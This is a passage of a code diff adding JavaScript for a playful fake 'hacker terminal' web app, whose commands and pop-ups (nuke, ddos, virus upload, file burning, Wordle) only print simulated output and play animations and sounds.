+      'targets.txt': '192.168.1.1     GATEWAY\n10.0.0.50       DATABASE\n172.16.0.100    MAINFRAME\n10.10.10.1      FIREWALL',
+    };
+    if (fakeFiles[f]) { Terminal.printLine('<pre style="margin:0;color:var(--color-text);font-size:11px;">' + fakeFiles[f] + '</pre>'); }
+    else if (f) { Terminal.printLine('<span class="cmd-error">cat: ' + f + ': Permission denied or not found</span>'); }
+    else { Terminal.printLine('<span class="cmd-error">Usage: cat &lt;filename&gt;</span>'); }
+  },
+
+  rm(args) {
+    const full = args.join(' ');
+    if (full.includes('-rf') && full.includes('/')) {
+      Terminal.printLine('Nice try.');
+      Terminal.close();
+      setTimeout(() => {
+        Terminal.open();
+        Terminal.printLine('<span class="cmd-error">...just kidding. Deleting everything.</span>');
+        let pct = 0;
+        const iv = setInterval(() => {
+          pct += ri(5, 20);
+          if (pct >= 100) { pct = 100; clearInterval(iv);
+            Terminal.printLine('<span class="cmd-error">SYSTEM DESTROYED</span>');
+            Terminal.close();
+            setTimeout(() => Overlays.show('denied', 3000, () => AudioEngine.playDenied()), 500);
+          }
+          Terminal.printLine('Deleting... ' + Math.min(pct,100) + '%');
+        }, 200);
+      }, 1500);
+      return;
+    }
+    Terminal.printLine('<span class="cmd-error">rm: operation not permitted</span>');
+  },
+
+  ping(args) {
+    const host = args[0] || '127.0.0.1';
+    Terminal.printLine('PING ' + host + ' 56 data bytes');
+    for (let i = 0; i < 4; i++) {
+      Terminal.printLine('64 bytes from ' + host + ': icmp_seq=' + (i+1) + ' ttl=64 time=' + (Math.random()*50).toFixed(1) + ' ms');
+    }
+    Terminal.printLine('--- ' + host + ' ping statistics ---\n4 packets transmitted, 4 received, 0% loss');
+  },
+
+  ifconfig() {
+    Terminal.printLine('eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500');
+    Terminal.printLine('        inet ' + ri(10,172) + '.' + ri(0,255) + '.' + ri(0,255) + '.' + ri(1,254) + '  netmask 255.255.255.0');
+    Terminal.printLine('        ether de:ad:be:ef:' + ri(10,99) + ':' + ri(10,99));
+    Terminal.printLine('        RX packets ' + ri(10000,99999) + '  bytes ' + ri(1000000,9999999));
+    Terminal.printLine('        TX packets ' + ri(10000,99999) + '  bytes ' + ri(1000000,9999999));
+  },
+
+  uname(args) {
+    Terminal.printLine('Linux darknet 6.6.6-exploit-custom #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux');
+  },
+
+  uptime() {
+    Terminal.printLine(' ' + new Date().toTimeString().substr(0,8) + ' up ' + ri(1,365) + ' days, ' + ri(0,23) + ':' + ri(10,59) + ', 1 user, load average: ' + (Math.random()*4).toFixed(2) + ', ' + (Math.random()*3).toFixed(2) + ', ' + (Math.random()*2).toFixed(2));
+  },
+
+  clear() {
+    dom.codeOutput.innerHTML = '';
+    Terminal.close();
+  },
+
+  status() {
+    const langNames = ['C/Kernel','C/AES','C/Exploit','Python','Assembly','Rust','Go','JavaScript'];
+    Terminal.printLine('<span class="cmd-highlight">HACKTERM STATUS</span>');
+    Terminal.printLine('Theme:    ' + state.theme.toUpperCase());
+    Terminal.printLine('Channel:  ' + state.codeIndex + ' (' + (langNames[state.codeIndex]||'?') + ')');
+    Terminal.printLine('Chars:    ' + state.charsTyped);
+    Terminal.printLine('Sound:    ' + (state.soundEnabled ? 'ON' : 'OFF'));
+    Terminal.printLine('Glitch:   ' + (state.glitchOn ? 'ON' : 'OFF'));
+    Terminal.printLine('CRT:      ' + (state.crtEnabled ? 'ON' : 'OFF'));
+  },
+
+  theme(args) {
+    const name = (args[0] || '').toLowerCase();
+    if (Themes.names.includes(name)) {
+      Themes.set(name);
+      Terminal.printLine('<span class="cmd-success">Theme set to ' + name.toUpperCase() + '</span>');
+    } else {
+      Terminal.printLine('<span class="cmd-error">Unknown theme. Available: ' + Themes.names.join(', ') + '</span>');
+    }
+  },
+
+  // === EFFECT COMMANDS (close terminal, trigger dramatic effect) ===
+  nuke() {
+    Terminal.close();
+    if (state.overlayActive) return;
+    state.overlayActive = true;
+    const el = document.getElementById('overlay-nuke');
+    const cd = document.getElementById('nuke-countdown');
+    // White flash
+    el.style.animation = 'nukeFlash 0.5s ease-out';
+    setTimeout(() => el.style.animation = '', 500);
+    el.classList.add('active');
+    AudioEngine.playDenied();
+    let count = 5;
+    cd.textContent = count;
+    const iv = setInterval(() => {
+      count--;
+      cd.textContent = count;
+      AudioEngine.playAlert();
+      if (count <= 3) {
+        document.body.classList.add('glitch-active');
+        setTimeout(() => document.body.classList.remove('glitch-active'), 100);
+      }
+      if (count <= 0) {
+        clearInterval(iv);
+        // Explosion
+        const color = '#ff4400';
+        for (let i = 0; i < 5; i++) {
+          setTimeout(() => Particles.emit(ri(100, window.innerWidth-100), ri(100, window.innerHeight-100), 80, color, 10, 60), i * 100);
+        }
+        document.body.classList.add('glitch-active');
+        cd.textContent = 'DETONATED';
+        setTimeout(() => {
+          document.body.classList.remove('glitch-active');
+          el.classList.add('exit');
+          setTimeout(() => { el.classList.remove('active','exit'); state.overlayActive = false; }, 400);
+        }, 2000);
+      }
+    }, 1000);
+  },
+
+  hack() {
+    Terminal.close();
+    // Rapid auto-type burst for 3 seconds
+    const burstIv = setInterval(() => TypingEngine.type(), 30);
+    // Quick overlay flashes
+    const overlayIds = ['granted','firewall','encrypt'];
+    let idx = 0;
+    const flashIv = setInterval(() => {
+      const oid = overlayIds[idx % overlayIds.length];
+      const oel = document.getElementById('overlay-' + oid);
+      oel.classList.add('active');
+      AudioEngine.playAlert();
+      setTimeout(() => oel.classList.remove('active'), 400);
+      idx++;
+    }, 600);
+    setTimeout(() => {
+      clearInterval(burstIv);
+      clearInterval(flashIv);
+      // End with access granted
+      Overlays.show('granted', 2000, () => AudioEngine.playGranted());
+    }, 3000);
+  },
+
+  launch() {
+    Terminal.close();
+    Overlays.show('satellite', 0);
+  },
+
+  decrypt() {
+    Terminal.close();
+    Overlays.show('encrypt', 4000);
+  },
+
+  rickroll() {
+    Terminal.close();
+    if (state.overlayActive) return;
+    state.overlayActive = true;
+    const el = document.getElementById('overlay-rickroll');
+    el.classList.add('active');
+    // Play ascending happy tones
+    if (state.soundEnabled && AudioEngine.ctx) {
+      const t = AudioEngine.ctx.currentTime;
+      [261, 293, 329, 349, 392, 440, 493, 523].forEach((f, i) => {
+        const osc = AudioEngine.ctx.createOscillator(), g = AudioEngine.ctx.createGain();
+        osc.type = 'square'; osc.frequency.value = f;
+        g.gain.setValueAtTime(0.06, t + i*0.15); g.gain.exponentialRampToValueAtTime(0.001, t + i*0.15 + 0.3);
+        osc.connect(g); g.connect(AudioEngine.compressor);
+        osc.start(t + i*0.15); osc.stop(t + i*0.15 + 0.35);
+      });
+    }
+    Particles.emit(window.innerWidth/2, window.innerHeight/2, 100, '#ff00ff', 8, 60);
+    setTimeout(() => {
+      el.classList.add('exit');
+      setTimeout(() => { el.classList.remove('active','exit'); state.overlayActive = false; }, 400);
+    }, 3500);
+  },
+
+  matrix() {
+    Terminal.close();
+    const orig = getComputedStyle(document.body).getPropertyValue('--matrix-opacity').trim();
+    document.getElementById('matrix-rain').style.opacity = '1';
+    document.getElementById('matrix-rain').style.transition = 'opacity 0.3s';
+    setTimeout(() => {
+      document.getElementById('matrix-rain').style.opacity = orig || '0.25';
+      setTimeout(() => document.getElementById('matrix-rain').style.transition = '', 500);
+    }, 5000);
+  },
+
+  panic() {
+    Terminal.close();
+    Themes.set('redalert');
+    Overlays.show('denied', 3000, () => AudioEngine.playDenied());
+    // Shake loop
+    document.body.classList.add('glitch-active');
+    setTimeout(() => document.body.classList.remove('glitch-active'), 3000);
+  },
+
+  ddos() {
+    Terminal.close();
+    if (state.overlayActive) return;
+    state.overlayActive = true;
+    const el = document.getElementById('overlay-ddos');
+    const counter = document.getElementById('ddos-counter');
+    const bar = document.getElementById('ddos-bar-fill');
+    el.classList.add('active');
+    bar.style.width = '0%';
+    AudioEngine.playAlert();
+    let conns = 0;
+    const targets = [100, 500, 1000, 5000, 10000, 50000, 100000, 500000, 1000000, 9999999];
+    let step = 0;
+    const iv = setInterval(() => {
+      if (step < targets.length) {
+        conns = targets[step];
+        counter.textContent = conns.toLocaleString() + ' CONNECTIONS';
+        bar.style.width = ((step + 1) / targets.length * 100) + '%';
+        if (step > 5) AudioEngine.playAlert();
+        step++;
+      } else {
+        clearInterval(iv);
+        counter.textContent = 'TARGET OVERWHELMED';
+        Particles.emit(window.innerWidth/2, window.innerHeight/2, 80, '#ff0000', 8, 50);
+        setTimeout(() => {
+          el.classList.add('exit');
+          setTimeout(() => { el.classList.remove('active','exit'); state.overlayActive = false; }, 400);
+        }, 1500);
+      }
+    }, 350);
+  },
+
+  sudo(args) {
+    Terminal.close();
+    const rndTheme = Themes.names[ri(0, Themes.names.length - 1)];
+    Themes.set(rndTheme);
+    Overlays.show('granted', 2500, () => AudioEngine.playGranted());
+  },
+
+  jailbreak() {
+    Terminal.close();
+    JailbreakGame.start();
+  },
+
+  exit() {
+    Terminal.close();
+    // Screen goes black
+    document.getElementById('app').style.opacity = '0';
+    document.getElementById('app').style.transition = 'opacity 0.5s';
+    Terminal.printToMain('<span class="cmd-error">CONNECTION TERMINATED</span>');
+    setTimeout(() => {
+      document.getElementById('app').style.opacity = '1';
+      setTimeout(() => document.getElementById('app').style.transition = '', 500);
+    }, 2500);
+  },
+
+  pizza() {
+    Terminal.close();
+    if (state.overlayActive) return;
+    state.overlayActive = true;
+    const el = document.getElementById('overlay-pizza');
+    el.classList.add('active');
+    AudioEngine.playAlert();
+    setTimeout(() => {
+      el.classList.add('exit');
+      setTimeout(() => {
+        el.classList.remove('active','exit');
+        state.overlayActive = false;
+        // Print large ASCII pizza to code-output
+        const pizzaArt = [
+          '<span style="color:#ff6600;">                    .-\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'-.                    </span>',
+          '<span style="color:#ff8800;">                .\'                       \'.                </span>',
+          '<span style="color:#ffaa00;">              /     .      .       .       \\              </span>',
+          '<span style="color:#ffcc00;">            /    .    ____     ____    .     \\            </span>',
+          '<span style="color:#ff6600;">           |      .  (    )   (    )  .       |           </span>',
+          '<span style="color:#cc3300;">           |        . \\__/  .  \\__/      .    |           </span>',
+          '<span style="color:#ff4400;">           |   ____         .       ____      |           </span>',
+          '<span style="color:#ff6600;">           |  (    )   .       .   (    )     |           </span>',
+          '<span style="color:#cc3300;">           |   \\__/        ____     \\__/   .  |           </span>',
+          '<span style="color:#ff4400;">            \\      .      (    )  .         /            </span>',
+          '<span style="color:#ff8800;">             \\   .    .    \\__/       .    /             </span>',
+          '<span style="color:#ffaa00;">              \\       .         .   .    /              </span>',
+          '<span style="color:#ffcc00;">                \'.      .   .       .\'                </span>',
+          '<span style="color:#ff6600;">                  \'-._______________.-\'                  </span>',
+          '',
+          '<span style="color:#44ff44;">      ========================</span>',
+          '<span style="color:#44ff44;">       PIZZA.EXE DELIVERED   </span>',
+          '<span style="color:#44ff44;">      ========================</span>',
+        ];
+        pizzaArt.forEach(line => {
+          const div = document.createElement('div');
+          div.className = 'cmd-output';
+          div.innerHTML = line;
+          div.style.fontFamily = 'monospace';
+          div.style.whiteSpace = 'pre';
+          div.style.lineHeight = '1.2';
+          dom.codeOutput.appendChild(div);
+        });
+        scrollCodeToBottom();
+      }, 400);
+    }, 2000);
+  },
+};
+
+// ===== SCREEN CRACK EFFECT =====
+const ScreenCrack = {
+  show() {
+    const overlay = document.getElementById('crack-overlay');
+    const svg = document.getElementById('crack-svg');
+    svg.innerHTML = '';
+    const cx = 960, cy = 540;
+    // Generate crack lines radiating from center
+    const numBranches = 8 + ri(0, 5);
+    for (let b = 0; b < numBranches; b++) {
+      let angle = (b / numBranches) * Math.PI * 2 + (Math.random() - 0.5) * 0.4;
+      let x = cx, y = cy;
+      const segments = 3 + ri(0, 4);
+      for (let s = 0; s < segments; s++) {
+        const len = 40 + Math.random() * 120;
+        angle += (Math.random() - 0.5) * 0.8;
+        const nx = x + Math.cos(angle) * len;
+        const ny = y + Math.sin(angle) * len;
+        const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
+        line.setAttribute('x1', x); line.setAttribute('y1', y);
+        line.setAttribute('x2', nx); line.setAttribute('y2', ny);
+        line.style.animationDelay = (s * 0.05) + 's';
+        svg.appendChild(line);
+        // Sub-branches
+        if (Math.random() < 0.5) {
+          const subAngle = angle + (Math.random() - 0.5) * 1.2;
+          const subLen = 20 + Math.random() * 60;
+          const sx = x + Math.cos(subAngle) * subLen;
+          const sy = y + Math.sin(subAngle) * subLen;
+          const subLine = document.createElementNS('http://www.w3.org/2000/svg', 'line');
+          subLine.setAttribute('x1', x); subLine.setAttribute('y1', y);
+          subLine.setAttribute('x2', sx); subLine.setAttribute('y2', sy);
+          subLine.style.animationDelay = (s * 0.05 + 0.05) + 's';
+          svg.appendChild(subLine);
+        }
+        x = nx; y = ny;
+      }
+    }
+    overlay.classList.add('active');
+  },
+  hide() {
+    const overlay = document.getElementById('crack-overlay');
+    overlay.classList.add('fade-out');
+    setTimeout(() => { overlay.classList.remove('active','fade-out'); }, 500);
+  }
+};
+
+// ===== TYPING TRAIL PARTICLES =====
+const TypingTrail = {
+  emit() {
+    const rect = dom.codeOutputContainer.getBoundingClientRect();
+    // Approximate position: bottom-right of the visible code area
+    const x = rect.left + rect.width * (0.3 + Math.random() * 0.5);
+    const y = rect.top + rect.height - 20 + (Math.random() - 0.5) * 30;
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+    const count = 2 + ri(0, 1);
+    for (let i = 0; i < count; i++) {
+      Particles.particles.push({
+        x: x + (Math.random() - 0.5) * 10,
+        y: y,
+        vx: (Math.random() - 0.5) * 0.5,
+        vy: -(0.3 + Math.random() * 0.7),
+        life: 0,
+        maxLife: 20 + ri(0, 10),
+        size: 1 + Math.random(),
+        color: color
+      });
+    }
+  }
+};
+
+// ===== PRANK MODE =====
+const PrankMode = {
+  toggle() {
+    state.prankMode = !state.prankMode;
+    const overlay = document.getElementById('prank-overlay');
+    if (state.prankMode) {
+      overlay.classList.add('active');
+      this.updateClock();
+      this._clockIv = setInterval(() => this.updateClock(), 1000);
+    } else {
+      overlay.classList.remove('active');
+      if (this._clockIv) clearInterval(this._clockIv);
+    }
+  },
+  updateClock() {
+    const el = document.getElementById('prank-clock');
+    if (el) {
+      const now = new Date();
+      el.textContent = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
+    }
+  }
+};
+
+// ===== POPUP DIALOGS =====
+const PopupDialogs = {
+  lineCounter: 0,
+  threshold: 0,
+  activePopups: [],
+  _nextId: 0,
+
+  init() {
+    this.threshold = ri(20, 80);
+  },
+
+  tick() {
+    this.lineCounter++;
+    if (this.lineCounter >= this.threshold) {
+      this.lineCounter = 0;
+      this.threshold = ri(20, 80);
+      this.spawn();
+    }
+  },
+
+  _getColor() {
+    return getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+  },
+
+  _pos() {
+    const w = window.innerWidth, h = window.innerHeight;
+    let x, y;
+    if (Math.random() < 0.5) {
+      x = ri(Math.floor(w * 0.4), Math.max(Math.floor(w * 0.95) - 640, Math.floor(w * 0.4)));
+      y = ri(40, Math.max(40, Math.floor(h * 0.6)));
+    } else {
+      x = ri(40, Math.max(40, Math.floor(w * 0.85) - 640));
+      y = ri(40, Math.max(40, Math.floor(h * 0.35)));
+    }
+    x = Math.max(10, Math.min(x, w - 650));
+    y = Math.max(10, Math.min(y, h - 340));
+    return { x, y };
+  },
+
+  _create(title, width) {
+    const id = 'hpop-' + (this._nextId++);
+    const pos = this._pos();
+    const el = document.createElement('div');
+    el.className = 'hacker-popup';
+    el.id = id;
+    el.style.left = pos.x + 'px';
+    el.style.top = pos.y + 'px';
+    if (width) el.style.width = width + 'px';
+    el.innerHTML = '<div class="hacker-popup-titlebar"><span>' + title + '</span><button class="hacker-popup-close" onclick="PopupDialogs.close(\'' + id + '\')">X</button></div><div class="hacker-popup-content"></div>';
+    document.body.appendChild(el);
+    const rec = { id, el, intervals: [], timeouts: [] };
+    this.activePopups.push(rec);
+    return rec;
+  },
+
+  close(id) {
+    const idx = this.activePopups.findIndex(p => p.id === id);
+    if (idx === -1) return;
+    const rec = this.activePopups[idx];
+    rec.intervals.forEach(clearInterval);
+    rec.timeouts.forEach(clearTimeout);
+    rec.el.classList.add('closing');
+    setTimeout(() => { if (rec.el.parentNode) rec.el.remove(); }, 260);
+    this.activePopups.splice(idx, 1);
+  },
+
+  closeAll() {
+    [...this.activePopups].forEach(p => this.close(p.id));
+  },
+
+  _autoClose(rec, ms) {
+    const t = setTimeout(() => this.close(rec.id), ms);
+    rec.timeouts.push(t);
+  },
+
+  _content(rec) {
+    return rec.el.querySelector('.hacker-popup-content');
+  },
+
+  spawn() {
+    const types = [
+      () => this._defrag(),
+      () => this._uploadVirus(),
+      () => this._neurotoxin(),
+      () => this._airTraffic(),
+      () => this._setec(),
+      () => this._energyGrid(),
+      () => this._antimatter(),
+      () => this._jollyRoger(),
+      () => this._wordle(),
+      () => this._burnFiles(),
+      () => this._darknet(),
+      () => this._releaseHounds(),
+      () => this._callingMom(),
+      () => this._connectAOL(),
+      () => this._neuralNet()
+    ];
+    types[ri(0, types.length - 1)]();
+  },
+
+  // 1. Defrag Mainframe
+  _defrag() {
+    const rec = this._create('DEFRAG MAINFRAME', 600);
+    const c = this._content(rec);
+    const cols = 12, rows = 8;
+    const cells = [];
+    const colors = ['#ff2222','#ff8800','#ffee00','#22ff44','#2288ff','#aa44ff','#ff44aa','#888888'];
+    c.style.display = 'flex'; c.style.flexWrap = 'wrap'; c.style.gap = '2px'; c.style.alignContent = 'start';
+    for (let i = 0; i < cols * rows; i++) {
+      const d = document.createElement('div');
+      d.style.cssText = 'width:20px;height:16px;background:' + colors[ri(0, colors.length-1)] + ';opacity:0.7;transition:background 0.3s;';
+      c.appendChild(d);
+      cells.push(d);
+    }
+    let step = 0;
+    const iv = setInterval(() => {
+      if (step >= cells.length) { clearInterval(iv); this._autoClose(rec, 600); return; }
+      const sorted = [...colors].sort();
+      cells[step].style.background = sorted[step % sorted.length];
+      cells[step].style.opacity = '1';
+      step++;
+    }, 40);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 4500);
+  },
+
+  // 2. Upload Virus
+  _uploadVirus() {
+    const rec = this._create('UPLOAD VIRUS', 600);
+    const c = this._content(rec);
+    const fnames = ['trojan.exe','worm_v3.dll','rootkit.sys','payload.bin','backdoor.sh','keylogger.dat'];
+    c.innerHTML = '<div class="dim" id="vf-' + rec.id + '">' + fnames[0] + '</div><div class="progress-bar"><div class="progress-bar-fill" id="vb-' + rec.id + '"></div></div><div id="vp-' + rec.id + '">0%</div>';
+    let pct = 0, fi = 0;
+    const iv = setInterval(() => {
+      pct += ri(3, 12);
+      if (pct > 100) pct = 100;
+      fi = (fi + 1) % fnames.length;
+      const bar = document.getElementById('vb-' + rec.id);
+      const lbl = document.getElementById('vp-' + rec.id);
+      const fn = document.getElementById('vf-' + rec.id);
+      if (bar) bar.style.width = pct + '%';
+      if (lbl) lbl.textContent = pct + '%' + (pct >= 100 ? ' \uD83D\uDC80' : '');
+      if (fn && pct < 100) fn.textContent = fnames[fi];
+      if (pct >= 100) { clearInterval(iv); this._autoClose(rec, 800); }
+    }, 120);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 3500);
+  },
+
+  // 3. Neurotoxin
+  _neurotoxin() {
+    const rec = this._create('NEUROTOXIN RELEASE', 560);
+    const c = this._content(rec);
+    c.innerHTML = '<div style="text-align:center;font-size:28px;">\u2623</div><div class="danger" style="text-align:center;font-size:16px;" id="nd-' + rec.id + '">DANGER</div><div style="text-align:center;margin-top:6px;" id="np-' + rec.id + '">0%</div>';
+    let pct = 0, blink = false;
+    const iv = setInterval(() => {
+      pct += ri(2, 8);
+      if (pct > 100) pct = 100;
+      blink = !blink;
+      const d = document.getElementById('nd-' + rec.id);
+      const p = document.getElementById('np-' + rec.id);
+      if (d) d.style.visibility = blink ? 'visible' : 'hidden';
+      if (p) p.textContent = pct + '%';
+      if (pct >= 100) { clearInterval(iv); if (d) { d.style.visibility = 'visible'; d.textContent = 'RELEASE COMPLETE'; } this._autoClose(rec, 600); }
+    }, 100);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 4500);
+  },
+
+  // 4. Air Traffic
+  _airTraffic() {
+    const rec = this._create('AIR TRAFFIC CONTROL', 680);
+    const c = this._content(rec);
+    const airlines = ['AA','UA','DL','SW','BA','LH','AF','JL'];
+    const flights = [];
+    for (let i = 0; i < 6; i++) flights.push(airlines[ri(0,airlines.length-1)] + '-' + ri(100,9999));
+    let html = '';
+    flights.forEach((f, i) => { html += '<div id="atf-' + rec.id + '-' + i + '" style="margin:2px 0;">' + f + ' <span class="success">ON COURSE</span></div>'; });
+    c.innerHTML = html;
+    let idx = 0;
+    const iv = setInterval(() => {
+      if (idx >= flights.length) { clearInterval(iv); this._autoClose(rec, 600); return; }
+      const el = document.getElementById('atf-' + rec.id + '-' + idx);
+      if (el) el.innerHTML = flights[idx] + ' <span class="danger">DIVERTED</span>';
+      idx++;
+    }, 700);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 5500);
+  },
+
+  // 5. Setec Astronomy
+  _setec() {
+    const rec = this._create('SETEC ASTRONOMY', 600);
+    const c = this._content(rec);
+    const target1 = 'TOO MANY SECRETS';
+    const target2 = 'NO MORE SECRETS';
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ ';
+    let arr = [];
+    for (let i = 0; i < target1.length; i++) arr.push(chars[ri(0, chars.length-1)]);
+    c.innerHTML = '<div style="font-size:16px;letter-spacing:2px;text-align:center;margin-top:10px;" id="sa-' + rec.id + '">' + arr.join('') + '</div>';
+    let solved = 0, phase = 1;
+    const iv = setInterval(() => {
+      const el = document.getElementById('sa-' + rec.id);
+      if (!el) return;
+      const target = phase === 1 ? target1 : target2;
+      if (solved < target.length) {
+        for (let i = solved; i < target.length; i++) arr[i] = chars[ri(0, chars.length-1)];
+        arr[solved] = target[solved];
+        solved++;
+        el.textContent = arr.join('');
+      } else if (phase === 1) {
+        phase = 2; solved = 0;
+        arr = [];
+        for (let i = 0; i < target2.length; i++) arr.push(chars[ri(0, chars.length-1)]);
+      } else {
+        clearInterval(iv);
+        el.textContent = target2;
+        this._autoClose(rec, 800);
+      }
+    }, 120);
+    rec.intervals.push(iv);
+  },
+
+  // 6. Energy Grid
+  _energyGrid() {
+    const rec = this._create('ENERGY GRID', 600);
+    const c = this._content(rec);
+    const regions = ['NORTHEAST','SOUTHEAST','MIDWEST','SOUTHWEST','NORTHWEST','PACIFIC'];
+    let powers = regions.map(() => 100);
+    let html = '';
+    regions.forEach((r, i) => { html += '<div id="eg-' + rec.id + '-' + i + '" style="margin:2px 0;">' + r + ': <span class="success">100%</span></div>'; });
+    c.innerHTML = html;
+    let idx = 0;
+    const iv = setInterval(() => {
+      if (idx >= regions.length) { clearInterval(iv); this._autoClose(rec, 600); return; }
+      powers[idx] = 0;
+      const el = document.getElementById('eg-' + rec.id + '-' + idx);
+      if (el) el.innerHTML = regions[idx] + ': <span class="danger">0% OFFLINE</span>';
+      idx++;
+    }, 600);
+    rec.intervals.push(iv);
+  },
+
+  // 7. Antimatter
+  _antimatter() {
+    const rec = this._create('ANTIMATTER DISTILLERY', 600);
+    const c = this._content(rec);
+    c.innerHTML = '<div style="text-align:center;" id="ap-' + rec.id + '">Containment: 0%</div><div id="ac-' + rec.id + '" style="position:relative;height:80px;border:1px solid var(--color-border);margin-top:6px;overflow:hidden;"></div>';
+    const container = document.getElementById('ac-' + rec.id);
+    const dots = [];
+    for (let i = 0; i < 12; i++) {
+      const d = document.createElement('div');
+      d.style.cssText = 'position:absolute;width:4px;height:4px;border-radius:50%;background:' + this._getColor() + ';';
+      d.style.left = ri(5, 90) + '%'; d.style.top = ri(5, 90) + '%';
+      if (container) container.appendChild(d);
+      dots.push({ el: d, vx: (Math.random()-0.5)*4, vy: (Math.random()-0.5)*4 });
+    }
+    let pct = 0;
+    const iv = setInterval(() => {
+      pct += ri(1, 5);
+      if (pct > 100) pct = 100;
+      const lbl = document.getElementById('ap-' + rec.id);
+      if (lbl) lbl.textContent = 'Containment: ' + pct + '%';
+      dots.forEach(dot => {
+        let l = parseFloat(dot.el.style.left);
+        let t = parseFloat(dot.el.style.top);
+        l += dot.vx; t += dot.vy;
+        if (l < 2 || l > 95) dot.vx *= -1;
+        if (t < 2 || t > 90) dot.vy *= -1;
+        dot.el.style.left = Math.max(2,Math.min(95,l)) + '%';
+        dot.el.style.top = Math.max(2,Math.min(90,t)) + '%';
+      });
+    }, 80);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 5000);
+  },
+
+  // 8. Jolly Roger
+  _jollyRoger() {
+    const rec = this._create('JOLLY ROGER DEPLOYED', 520);
+    const c = this._content(rec);
+    const skull = '    ___\n   /   \\\\\n  | X X |\n  |  ^  |\n   \\\\___/\n   /| |\\\\';
+    c.innerHTML = '<pre style="text-align:center;font-size:14px;line-height:1.2;" id="jr-' + rec.id + '">' + skull + '</pre>';
+    let blink = false;
+    const iv = setInterval(() => {
+      blink = !blink;
+      const el = document.getElementById('jr-' + rec.id);
+      if (!el) return;
+      const s = blink ? skull.replace('X X', 'O X') : skull;
+      el.textContent = s;
+    }, 500);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 5000);
+  },
+
+  // 9. Wordle
+  _wordle() {
+    const rec = this._create('BRUTE FORCE: WORDLE', 560);
+    const c = this._content(rec);
+    const words = ['CRANE','GHOST','PLANE','STARE','ADIEU','MONEY','FLESH','TRICK','CLIMB','BINGO','FLAME','SUPER'];
+    const target = words[ri(0, words.length-1)];
+    let html = '';
+    for (let r = 0; r < 5; r++) {
+      html += '<div class="wordle-row" id="wr-' + rec.id + '-' + r + '">';
+      for (let c2 = 0; c2 < 5; c2++) html += '<div class="wordle-cell wc-gray" id="wc-' + rec.id + '-' + r + '-' + c2 + '">-</div>';
+      html += '</div>';
+    }
+    c.innerHTML = html;
+    let row = 0;
+    const iv = setInterval(() => {
+      if (row >= 5) { clearInterval(iv); return; }
+      const guess = row < 4 ? words[ri(0, words.length-1)] : target;
+      for (let i = 0; i < 5; i++) {
+        const cell = document.getElementById('wc-' + rec.id + '-' + row + '-' + i);
+        if (!cell) continue;
+        cell.textContent = guess[i];
+        if (guess[i] === target[i]) cell.className = 'wordle-cell wc-green';
+        else if (target.includes(guess[i])) cell.className = 'wordle-cell wc-yellow';
+        else cell.className = 'wordle-cell wc-gray';
+      }
+      if (guess === target) {
+        clearInterval(iv);
+        this._autoClose(rec, 1000);
+      }
+      row++;
+    }, 500);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 4000);
+  },
+
+  // 10. Burn Files
+  _burnFiles() {
+    const rec = this._create('BURN FILES', 600);
+    const c = this._content(rec);
+    const files = ['/var/classified/op_sunrise.pdf','/home/admin/.ssh/id_rsa','/etc/shadow','/opt/data/agents.db','/tmp/exfil_log.enc','/root/blackbook.gpg','/srv/intel/drop_coords.dat'];
+    let html = '';
+    files.forEach((f, i) => { html += '<div id="bf-' + rec.id + '-' + i + '" style="margin:1px 0;font-size:11px;">' + f + '</div>'; });
+    c.innerHTML = html;
+    let idx = 0;
+    const iv = setInterval(() => {
+      if (idx >= files.length) { clearInterval(iv); this._autoClose(rec, 600); return; }
+      const el = document.getElementById('bf-' + rec.id + '-' + idx);
+      if (el) { el.style.textDecoration = 'line-through'; el.style.color = '#ff4444'; el.textContent = files[idx] + ' [DELETED]'; }
+      idx++;
+    }, 500);
+    rec.intervals.push(iv);
+  },
+
+  // 11. Darknet
+  _darknet() {
+    const rec = this._create('DARKNET ALERT', 520);
+    const c = this._content(rec);
+    c.innerHTML = '<div class="danger" style="text-align:center;">ALERTING CONTACTS...</div>';
+    const aliases = [
+      { name: 'GHOST_PHANTOM', msg: 'I\'m in position...' },
+      { name: 'ZER0DAY', msg: 'Payload ready.' },
+      { name: 'DARKWING', msg: 'Eyes on target.' }
+    ];
+    aliases.forEach((a, i) => {
+      const t = setTimeout(() => {
+        const sub = this._create(a.name, 440);
+        const sc = this._content(sub);
+        sc.innerHTML = '<div class="dim" id="dc-' + sub.id + '"></div>';
+        let ci = 0;
+        const iv2 = setInterval(() => {
+          const el = document.getElementById('dc-' + sub.id);
+          if (!el) { clearInterval(iv2); return; }
+          if (ci <= a.msg.length) { el.textContent = a.msg.substr(0, ci); ci++; }
+          else clearInterval(iv2);
+        }, 80);
+        sub.intervals.push(iv2);
+        this._autoClose(sub, 3500);
+      }, 400 * (i + 1));
+      rec.timeouts.push(t);
+    });
+    this._autoClose(rec, 4500);
+  },
+
+  // 12. Release the Hounds
+  _releaseHounds() {
+    const options = [
+      { title: 'RELEASE THE HOUNDS', emoji: '\uD83D\uDC15' },
+      { title: 'RELEASE THE KITTY CATS', emoji: '\uD83D\uDC31' },
+      { title: 'RELEASE THE VORPAL BUNNIES', emoji: '\uD83D\uDC30' },
+      { title: 'RELEASE THE HONEY BADGERS', emoji: '\uD83E\uDDA1' },
+      { title: 'RELEASE THE MANTIS SHRIMPS', emoji: '\uD83E\uDD90' }
+    ];
+    const pick = options[ri(0, options.length-1)];
+    const rec = this._create(pick.title, 560);
+    const c = this._content(rec);
+    c.innerHTML = '<div id="rh-' + rec.id + '" style="font-size:20px;line-height:1.3;word-wrap:break-word;"></div>';
+    let count = 0;
+    const iv = setInterval(() => {
+      const el = document.getElementById('rh-' + rec.id);
+      if (!el) return;
+      count++;
+      el.textContent += pick.emoji;
+      if (count > 40) { clearInterval(iv); this._autoClose(rec, 500); }
+    }, 60);
+    rec.intervals.push(iv);
